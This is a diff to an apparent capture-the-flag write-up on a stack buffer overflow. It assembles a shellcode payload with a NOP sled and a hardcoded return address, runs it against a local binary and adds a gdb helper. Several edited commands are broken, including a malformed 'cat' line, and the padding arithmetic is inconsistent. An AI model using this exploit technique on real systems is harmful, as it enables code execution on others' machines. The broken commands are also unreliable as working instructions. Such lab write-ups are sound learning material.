@@ -165,7 +165,7 @@ That means we need to have a payload of 96 bytes: 88 bytes of payload to overflo
 Let's setup the payload with padding end the address with need to replace at the end.
 
 ```
-[shellcode - 31 bytes] [padding - X bytes] [return address - 8 bytes]
+[padding (NOP sled) - X bytes] [shellcode - 31 bytes] [padding - X bytes] [return address - 8 bytes]
 ```
 
 So we need `88 - 31 - 8 = 49` bytes of padding.
@@ -179,14 +179,14 @@ printf 'a%.0s' {1..49} > padding.bin
 printf '\x10\xe2\xff\xff\xff\x7f\x00\x00' > retaddr.bin
 
 # Final assembly
-cat shellcode.bin padding.bin retaddr.bin > payload.bin
+padding.bin cat shellcode.bin retaddr.bin > payload.bin
 ```
 
 Or single line
 ```
 {
-  xxd -p shellcode.bin | tr -d '\n'
   printf '90%.0s' {1..57}
+  xxd -p shellcode.bin | tr -d '\n'
   echo -n '10e2ffffff7f0000'
 } | xxd -r -p > payload.bin
 ```
@@ -199,4 +199,15 @@ scp -P 4242 ./payload.bin level00@localhost:/home/level00
 Run the exploit
 ```
 cat payload.bin | ./case
+```
+
+## Helper
+
+### Run gdb with injected payload
+
+```
+gdb -n case
+set args < payload.bin
+# jump before gets call
+b *0x401596
 ```
